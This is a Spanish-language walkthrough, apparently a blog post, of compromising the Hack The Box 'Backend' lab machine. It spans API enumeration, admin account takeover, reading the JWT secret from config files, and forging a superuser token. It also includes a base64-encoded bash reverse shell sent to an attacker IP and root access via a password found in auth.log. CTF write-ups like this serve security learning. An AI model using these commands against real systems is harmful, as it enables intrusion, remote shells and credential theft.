---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Backend            |
| Os                     | Linux              |
| Difficulty             | Medium             |
| Points                 | 20                 |
| IP                     | 10.10.11.161       |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Backend/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.161
```

![nmap 1](/assets/images/Backend/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.161 -oG allPorts
```

![nmap 2](/assets/images/Backend/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p22,80 10.10.11.161 -oN targeted
```

![nmap 3](/assets/images/Backend/nmap3.png)

Tambien con la version de SSH, podemos obtener la version de Ubuntu ante el que estamos, en este caso seria con una busqueda solamente con _openssh 8.2p1 4ubuntu0.4 launchpad_, **Ubuntu Focal** nos dice la respuesta.

Proseguiremos a usar mas herramientas como WHATWEB, para listar las tecnologias que se estan usando, WFUZZ para listar posibles directorios

```s
whatweb http://10.10.11.161
```

![whatweb](/assets/images/Backend/whatweb.png)

```s
wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.161/FUZZ
```

![wfuzz](/assets/images/Backend/wfuzz.png)

Ahora podemos empezar a probar con la ruta /api, y dentro vemos que tambien esta disponible la ruta /v1/user y nos permite ver 2 usuarios, user y admin. Pero como no estamos autenticados, no podemos acceder. Continuando en la ruta user, podemos enumerar los usuarios con numeros enteros, igual con wfuzz podemos hacer lo siguiente:

```s
wfuzz -c --hc=404,422 --hh=4 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.161/api/v1/user/FUZZ
```

Como hicimos en BackendTwoo, usremos un script que nos liste todos los usuarios existentes de la siguiente manera:

Para listar todos los posibles usuarios, lo que haremos, con un script

```s
for i in $(seq 1 20); do curl -s -X GET "http://10.10.11.161/api/v1/user/$i" | jq '.["email"]' | tr -d '"'; done | grep -v "null" > users
#jq Para el formato en jquery y ademas que muestre solo el email
#Para borrar las comillas
#seq 1-5 para hacer un secuenciador del 1 al 5
#grep -v "null" para que no muestre el estado null
#> users    Guarda el resultado en un archivo llamado users para la evidencia
```

![Listing Users](/assets/images/Backend/list_users.png)

Esta busqueda tambien nos habia mostrado una seccion de login y signup, intentaremos ahora hacer una peticion con el metodo POST de la siguiente manera:

```s
curl -s -X POST "http://10.10.11.161/api/v1/user/signup" -H "Content-type: application/json" -d '{"email":"rebick@rebick.com", "password":"rebick123"}' | jq 
```

Ahora vemos que hemos podido agregar un usuario y loggearnos.

![User Added](/assets/images/Backend/user_added.png)

```s
curl -s -X POST "http://10.10.11.161/api/v1/user/login" -d 'username=rebick@rebick.com&password=rebick123' | jq 
```

Una vez dentro, vemos que nos ha generado un JWT al loggearnos. Y lo podemos interpretar con `jwt.io`.

![JWT](/assets/images/Backend/jwt.png)

Entramos ahora en /docs con Burpsuite, agregando la siguiente configuracion en MAtch and replace, para agregar el header:

![Response modified](/assets/images/Backend/burp_match_replace.png)

Ahora podemos recargar la pagina y visualizar la pagina /docs

![Docs view](/assets/images/Backend/docs_view.png)

Vemos varias opciones ahora para escribir apis de manera grafica.

Ahora, de acuerdo a la vulnerabilidad que presentaba BackendTwoo de MassAssignament, pudimos modificar el parametro is_superuser a traves de la API que modificaba la contrasena.

![Setting SuperUser](/assets/images/Backend/set_superuser.png)

Y verificamos con un:

```s
curl -s -X GET 'http://10.10.11.161/api/v1/user/2' -H 'accept: application/json' | jq
```

Vemos que no se ha cambiado, entonces procedemos a intentar otra cosa, conocemos el guid de Admin, asi que si le cambiamos la contrasena podremos ejecutar las APIs de Administrador.

![Logged as SuperUser](/assets/images/Backend/loged_as_admin.png)

Ahora podemos empezar a listar archivos, como la flag y continuaremos buscando la Secret Word para poder hacer nuestro propio JWT. Nos vamos a listar el /proc/self/environ para ver las variables de entorno que se estan ejecutando, y ahi mismo vemos que se lista la aplicacion. 

![Variables de entorno](/assets/images/Backend/variables_entorno.png)

Ahora solo tendremos que visualizar /home/htb/uhc/app/main.py, y vemos que se importa un archivo de configuracion. 

![Aplication](/assets/images/Backend/application.png)

Asi que ahora accederemos a la ruta /home/htb/uhc/app/core/config.py

![Secret](/assets/images/Backend/Secret_jwt.png)

Una vez con el secret, podemos agregar el parametro debug: true y de una vez hacemos nuestro usuario superadmin. Entonces ahora libremente podemos ejecutar un comando con:

```s
curl -s -X GET http://10.10.11.161/api/v1/admin/exec/whoami -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU1MzcyNTQ1LCJpYXQiOjE2NTQ2ODEzNDUsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOnRydWUsImRlYnVnIjp0cnVlLCJndWlkIjoiYWFlMGZjNjQtZGQyYy00ZjA3LTg0NDktMDU4Yjc2ODI2ZjY5In0.ABMueJp_DhAwqGqEhmUPAgH-dAbXlsvuOP1ErH_-FtE' | jq
```

![CMD test](/assets/images/Backend/cmd_test.png)

Procederemos ahora a ejecutar un reverse shell como en la maquina backendtwoo, en la que como pasa por URL, tendremos que codificar la reverse y al ejecutarse decodificarla. El script, como lo hicimos en AdmirerToo sera:

```s
curl -s -X GET "http://10.10.11.161/api/v1/admin/exec/echo%20YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzQ0NDQgMD4mMScK|base64%20-d|bash" -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjU1MzcyNTQ1LCJpYXQiOjE2NTQ2ODEzNDUsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOnRydWUsImRlYnVnIjp0cnVlLCJndWlkIjoiYWFlMGZjNjQtZGQyYy00ZjA3LTg0NDktMDU4Yjc2ODI2ZjY5In0.ABMueJp_DhAwqGqEhmUPAgH-dAbXlsvuOP1ErH_-FtE' | jq
```

![Reverse shell](/assets/images/Backend/reverse.png)

Para hacer una shell iteractiva:

```s
script /dev/null -c bash
```

Ctrl+Z

```s
stty raw -echo; fg
#ENTER
reset xterm

export TERM=xterm
```

Para las filas

```s
#Consulta de tamano
stty size
45  174
#Para definir
stty rows 45 colums 174
```

Ahora, dentro de uhc, vemos un archivo llamado auth.log, en el cual si le damos un cat vemos que hay intentos de inicio de sesion, tambien se observa que hay un intento de contrasena ingreados, con un su root, ingresamos la contrasena y habremos terminado la maquina.

![Root access](/assets/images/Backend/root.png)

![Powned](/assets/images/Backend/pwned.png)